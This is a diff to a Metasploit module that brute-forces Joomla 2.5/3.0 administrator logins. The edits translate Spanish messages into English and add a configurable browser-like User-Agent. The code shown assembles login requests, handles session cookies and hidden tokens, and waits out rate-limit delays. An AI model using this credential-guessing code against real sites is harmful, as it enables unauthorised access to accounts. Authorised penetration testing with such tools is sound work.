@@ -18,7 +18,7 @@ class Metasploit3 < Msf::Auxiliary
   def initialize
     super(
       'Name'           => 'BruteForce Joomla 2.5 or 3.0',
-      'Description'    => 'This module attempts to authenticate to Joomla 2.5. or 3.0',
+      'Description'    => 'This module attempts to authenticate to Joomla 2.5. or 3.0 through bruteforce attacks',
       'Author'         => [ 'luisco100[at]gmail[dot]com' ],
       'References'     =>
         [
@@ -43,7 +43,8 @@ class Metasploit3 < Msf::Auxiliary
       	OptString.new('WORD_ERROR_2', [ false, "Second option for the word of message for detect that login fail","login.html"]),
         OptString.new('WORD_ERROR_DELAY', [ false, "The word of message for active the delay time" , "por favor intente de nuevo en un minuto"]),
 	      OptInt.new('TIME_DELAY', [false, 'The delay time ', 0]),
-        OptString.new('REQUESTTYPE', [ false, "Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)", "POST" ])
+        OptString.new('REQUESTTYPE', [ false, "Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)", "POST" ]),
+        OptString.new('UserAgent', [ true, 'The HTTP User-Agent sent in the request', 'Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20140319 Firefox/24.0 Iceweasel/24.4.0' ]),
       ], self.class)
     register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])
   end
@@ -126,7 +127,7 @@ class Metasploit3 < Msf::Auxiliary
     else
       vprint_error("#{target_url} - Failed to login as '#{user}'")
     	if result == :delay
-		    print_status("Estableciendo retraso de un minuto")
+		    print_status("Establishing one minute delay")
 		    userpass_sleep_interval_add
       end
       return
@@ -163,7 +164,7 @@ class Metasploit3 < Msf::Auxiliary
         referer_var = "http://#{rhost}/administrator/index.php"
         ctype = 'application/x-www-form-urlencoded'
 
-        uid, cval, valor_hidden = get_login_cookie
+        uid, cval, hidden_value = get_login_cookie
 
         if uid
           indice = 0
@@ -174,7 +175,7 @@ class Metasploit3 < Msf::Auxiliary
           	indice = indice +1
           end
           value_cookie = value_cookie
-          print_status("Value of cookie ( #{value_cookie} ), Hidden ( #{valor_hidden}=1 )")
+          print_status("Value of cookie ( #{value_cookie} ), Hidden ( #{hidden_value}=1 )")
 
           data  = "#{user_var}=#{user}&"
           data << "#{pass_var}=#{pass}&"
@@ -182,7 +183,7 @@ class Metasploit3 < Msf::Auxiliary
           data << "option=com_login&"
           data << "task=login&"
           data << "return=aW5kZXgucGhw&"
-          data << "#{valor_hidden}=1"
+          data << "#{hidden_value}=1"
 
           response = send_request_raw({
             'uri' => @uri_mod,
@@ -193,11 +194,11 @@ class Metasploit3 < Msf::Auxiliary
             	{
               	'Content-Type'    => ctype,
               	'Referer' => referer_var,
-              	'User-Agent' => "Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20140319 Firefox/24.0 Iceweasel/24.4.0",
+              	'User-Agent' => datastore['UserAgent'],
             	},
           }, 30)
 
-          vprint_status("Código Primera respuesta : #{response.code}")
+          vprint_status("First Response Code : #{response.code}")
 
           if (response.code == 301 or response.code == 302 or response.code == 303) and response.headers['Location']
               
@@ -279,26 +280,25 @@ class Metasploit3 < Msf::Auxiliary
     		#print_status("#{form[1]}")
 
         if form.length == 1  #No es Joomla 2.5
-          print_error("Probando Formulario 3.0")
+          print_error("Testing Form Joomla 3.0")
           form = res.body.split(/<form action=([^\>]+) method="post" id="form-login" class="form-inline"\>(.*)<\/form>/mi)
         end
 
     		if not form
-    			print_error("Formulario Joomla No Encontrado")
+    			print_error("Joomla Form Not Found")
     			form = res.body.split(/<form id="login-form" action=([^\>]+)\>(.*)<\/form>/mi)
     		end
   		
     		input_hidden = form[2].split(/<input type="hidden"([^\>]+)\/>/mi)
     		#print_status("Formulario Encontrado #{form[2]}")
-    		print_status("--------> Formulario Joomla Encontrado <--------")
+    		print_status("--------> Joomla Form Found <--------")
     		#print_status("Campos Ocultos #{input_hidden[7]}")
     		input_id = input_hidden[7].split("\"")
     		#print_status("valor #{input_id[1]}")
     		valor_input_id = input_id[1]
       end
 
-      #Obtener el nombre de la variable de cookie de Joomla
-      indice_cookie = 0
+      #Get the name of the cookie variable Joomla
       uid = Array.new
       cval = Array.new
       #print_status("cookie = #{res.headers['Set-Cookie']}")
